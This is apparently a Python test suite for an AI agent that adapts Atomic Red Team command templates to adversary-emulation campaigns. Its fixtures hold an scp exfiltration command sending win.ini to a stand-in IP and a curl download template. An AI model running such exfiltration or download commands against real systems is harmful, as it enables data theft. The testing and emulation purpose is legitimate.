"""Agent command context and adaptation prompt (Req. 12.1-12.6, 12.17; task 45.6).

Deterministic: no network, no real database. Complements
``test_atomic_lookup_template_pool.py`` (pool shape from the DB) and
``test_op_agent_final_command.py`` (Final_Command validation, atomic_defaults
fallback, command_ref linkage) without repeating them.
"""

from __future__ import annotations

from typing import Any

import pytest

from app.services.ai import tools
from app.services.ai.agents.op_agent import AiOperationalizer
from app.services.ai.command_context import (
    CandidateContext,
    build_agent_command_context,
    render_campaign_facts,
    render_candidates,
)
from app.services.atomic_arguments import resolve_command
from app.services.command_base import CommandSuggestion
from app.services.flow.flow_view import FlowNodeView, FlowView

_TEMPLATE = "scp #{file} #{host}:$PathToAtomicsFolder/out"
_ARGS: dict[str, Any] = {
    "file": {"default": "C:\\\\Windows\\\\win.ini", "description": "file", "type": "path"},
    "host": {"default": "203.0.113.77", "description": "target", "type": "string"},
    "PathToAtomicsFolder": {"default": None, "description": "payload dir", "type": "path"},
}
# What resolve_command would produce from the defaults (must never be shown).
_EXAMPLE = "scp C:\\\\Windows\\\\win.ini 203.0.113.77:$PathToAtomicsFolder/out"


def _pool() -> list[dict[str, Any]]:
    return [
        {
            "technique_id": "T1048",
            "technique_name": "Exfiltration",
            "name": "sh",
            "platform": "linux",
            "command": _TEMPLATE,
            "command_ref": 7,
            "input_arguments": _ARGS,
        }
    ]


def _flow() -> FlowView:
    return FlowView(
        campaign_id="ctx-campaign",
        name="Context flow",
        curated=True,
        can_advance=True,
        nodes=[
            FlowNodeView(
                node_id="n0",
                technique_id="T1048",
                technique_name="Exfiltration",
                tactic="exfiltration",
            )
        ],
        edges=[],
    )


# ---------------------------------------------------------------- context ---


def test_context_keeps_template_verbatim_and_arguments() -> None:
    (candidate,) = build_agent_command_context(_pool())

    assert isinstance(candidate, CandidateContext)
    assert candidate.template == _TEMPLATE
    assert candidate.command_ref == 7
    assert candidate.platform == "linux" and candidate.executor == "sh"
    assert candidate.arguments == _ARGS
    assert candidate.arguments is not _ARGS  # copied, not aliased


def test_context_normalizes_missing_metadata_and_skips_empty_commands() -> None:
    pool = [
        {"command": "   ", "input_arguments": {}},
        {"command": "echo #{a}", "command_ref": None, "input_arguments": {"a": None}},
        {"command": "id", "command_ref": "not-an-int", "input_arguments": None},
    ]
    candidates = build_agent_command_context(pool)

    assert [c.template for c in candidates] == ["echo #{a}", "id"]
    assert candidates[0].command_ref is None and candidates[0].arguments == {"a": None}
    assert candidates[1].command_ref is None and candidates[1].arguments == {}


def test_render_candidates_shows_template_and_marks_defaults_as_suggestions() -> None:
    text = render_candidates(build_agent_command_context(_pool()))

    assert _TEMPLATE in text
    assert "the default is only a suggestion" in text
    for name in _ARGS:
        assert f"- {name}:" in text
    assert "203.0.113.77" in text  # the default is shown as metadata
    assert _EXAMPLE not in text  # but never as a substituted command


def test_render_candidates_similarity_names_without_metadata() -> None:
    pool = [{"command": "ping #{host}", "input_arguments": {"host": None}}]
    text = render_candidates(build_agent_command_context(pool))

    assert "- host: no metadata available" in text


def test_render_candidates_without_arguments() -> None:
    text = render_candidates(build_agent_command_context([{"command": "id"}]))

    assert "arguments: none" in text


def test_campaign_facts_list_only_known_data() -> None:
    text = render_campaign_facts(
        "slug-1",
        "My flow",
        [{"technique_id": "T1048", "technique_name": "Exfil", "tactic": "exfiltration"}],
    )

    assert "Campaign: slug-1" in text and "Flow: My flow" in text
    assert "T1048 Exfil (tactic: exfiltration)" in text
    assert "Containment rules" in text


# ----------------------------------------------------------------- prompt ---


def test_prompt_carries_adaptation_instruction_and_never_the_example() -> None:
    prompt = AiOperationalizer._build_prompt(
        _flow().nodes[0], _pool(), [{"content": "known shape"}], "Campaign: ctx"
    )

    assert _TEMPLATE in prompt
    assert _EXAMPLE not in prompt
    assert "only suggestions" in prompt  # defaults are suggestions
    assert "changes with every campaign" in prompt  # emulated environment
    assert "PathToAtomicsFolder" in prompt  # the agent decides the payload folder
    assert '"template"' in prompt and '"command"' in prompt  # response shape
    assert "must not contain any #{name} placeholder" in prompt
    assert "Campaign environment facts:\nCampaign: ctx" in prompt
    assert "- known shape" in prompt
    for name in _ARGS:
        assert f"- {name}:" in prompt


def test_prompt_is_built_without_calling_resolve_command(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    import app.services.atomic_arguments as atomic_arguments

    def _forbidden(*_a: Any, **_k: Any) -> Any:
        raise AssertionError("resolve_command must not run while building the context")

    monkeypatch.setattr(atomic_arguments, "resolve_command", _forbidden)
    render_candidates(build_agent_command_context(_pool()))
    AiOperationalizer._build_prompt(_flow().nodes[0], _pool(), [])


def test_prompt_sent_to_the_model_uses_the_template_pool() -> None:
    class _Chat:
        def __init__(self) -> None:
            self.prompts: list[str] = []

        def invoke(self, prompt: Any) -> Any:
            self.prompts.append(str(prompt))

            class _Reply:
                content = "[]"

            return _Reply()

    chat = _Chat()
    AiOperationalizer(chat=chat, atomic_lookup=lambda _t: _pool()).operationalize(
        "ctx-campaign", _flow()
    )

    (prompt,) = chat.prompts
    assert _TEMPLATE in prompt and _EXAMPLE not in prompt
    assert "Flow nodes:" in prompt and "T1048 Exfiltration" in prompt


# --------------------------------------------- similarity pool via the tool ---


def test_tool_atomic_lookup_similarity_candidate_has_names_only(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    template = "curl http://#{host}/#{path} -o $PathToAtomicsFolder/x"

    class _FakeCommandBase:
        def __init__(self, _session: Any) -> None: ...

        def commands_for_technique(self, technique_id: str) -> list[CommandSuggestion]:
            return [
                CommandSuggestion(
                    technique_id=technique_id,
                    command=template,
                    executor="sh",
                    platform="linux",
                    source="atomic_red_team",
                    exact=False,
                    id=99,  # must be ignored for similarity hits
                    input_arguments={"host": {"default": "h"}},  # ignored too
                )
            ]

    import app.services.command_base as command_base

    monkeypatch.setattr(command_base, "CommandBase", _FakeCommandBase)

    (entry,) = tools.tool_atomic_lookup("T1105", session=object())  # type: ignore[arg-type] -- test double stands in for the real collaborator

    assert entry["command"] == template
    assert entry["command_ref"] is None
    assert entry["input_arguments"] == {
        "host": None,
        "path": None,
        "PathToAtomicsFolder": None,
    }


# ------------------------------------- defaults only on the output side ------


def test_resolve_command_keeps_path_token_and_reports_it_unresolved() -> None:
    result = resolve_command(_TEMPLATE, _ARGS)

    assert "$PathToAtomicsFolder/out" in result.command
    assert "203.0.113.77" in result.command
    assert result.unresolved_arguments == ["PathToAtomicsFolder"]
